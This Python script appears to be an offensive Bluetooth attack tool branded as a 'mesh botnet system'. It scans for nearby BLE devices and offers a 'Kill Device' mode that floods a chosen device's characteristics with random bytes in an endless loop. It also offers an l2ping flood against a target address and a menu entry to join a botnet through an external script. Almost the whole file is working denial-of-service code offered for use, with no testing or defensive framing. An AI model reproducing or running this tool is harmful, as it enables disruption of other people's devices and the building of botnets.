```python
#!/usr/bin/env python3
import os, sys, time, subprocess, random
from bluepy.btle import Scanner, Peripheral, BTLEException, ADDR_TYPE_RANDOM

# BRANDING SPY-E & 123Tool
C, G, Y, R, W, B = '\033[96m', '\033[92m', '\033[93m', '\033[91m', '\033[0m', '\033[1m'

def banner():
    os.system('clear')
    print(f"""{R}{B}
 ██████╗██████╗ ██╗   ██╗      ██████╗ ██╗     ███████╗      ███╗   ██╗███████╗████████╗
██╔════╝██╔══██╗╚██╗ ██╔╝      ██╔══██╗██║     ██╔════╝      ████╗  ██║██╔════╝╚══██╔══╝
╚█████╗ ██████╔╝ ╚████╔╝ █████╗██████╔╝██║     █████╗  █████╗██╔██╗ ██║█████╗     ██║   
 ╚═══██╗██╔═══╝   ╚██╔╝  ╚════╝██╔══██╗██║     ██╔══╝  ╚════╝██║╚██╗██║██╔══╝     ██║   
██████╔╝██║        ██║         ██████╔╝███████╗███████╗      ██║ ╚████║███████╗    ██║   
╚═════╝ ╚═╝        ╚═╝         ╚═════╝ ╚══════╝╚══════╝      ╚═╝  ╚═══╝╚══════╝    ╚═╝   
{W}{C}  >>> NAGA-HITAM MESH BOTNET SYSTEM | SPY-E & 123Tool <<< {W}""")

def scan_all():
    print(f"{Y}[*] Scanning Aggressively...{W}")
    scanner = Scanner()
    try:
        devices = scanner.scan(10.0)
        for idx, dev in enumerate(devices):
            name = dev.getValueText(9) or "Unknown"
            print(f"{G}[{idx}] {dev.addr} ({name}) RSSI={dev.rssi}{W}")
        return list(devices)
    except Exception as e:
        print(f"{R}[!] Scan Error: {e}{W}"); return []

def jam_logic(target):
    print(f"{R}[!] Injecting Junk Packets to {target}...{W}")
    try:
        p = Peripheral(target, ADDR_TYPE_RANDOM)
        while True:
            # Mengirim data sampah ke handle sensitif secara acak
            p.writeCharacteristic(random.choice([0x000b, 0x000c, 0x0001]), os.urandom(100), withResponse=False)
            print(f"{R}>>> BLASTING {target}...{W}", end="\r")
    except Exception as e: print(f"{Y}[-] Disconnected: {e}{W}")

def main():
    banner()
    while True:
        print(f"\n{B}MODUL SERANGAN:{W}")
        print(f"1) {G}Quick Scan & Identify{W}")
        print(f"2) {G}Multi-Target Spam{W} (Broadcast)")
        print(f"3) {G}Targeted Jamming{W} (Kill Device)")
        print(f"4) {G}L2Ping Flood{W} (Classic Attack)")
        print(f"5) {C}Become Mesh Node{W} (Join Botnet)")
        print(f"0) Exit")
        
        cmd = input(f"\n{C}SPY-MASTER > {W}")
        
        if cmd == '1': scan_all()
        elif cmd == '3':
            devs = scan_all()
            if devs:
                idx = int(input(f"{Y}Pilih Index Target: {W}"))
                jam_logic(devs[idx].addr)
        elif cmd == '4':
            devs = scan_all()
            if devs:
                idx = int(input(f"{Y}Pilih Index Target: {W}"))
                os.system(f"sudo l2ping -i hci0 -c 1000 -s 600 {devs[idx].addr}")
        elif cmd == '5':
            os.system("python3 spy_node.py")
        elif cmd == '0': break

if __name__ == "__main__":
    main()
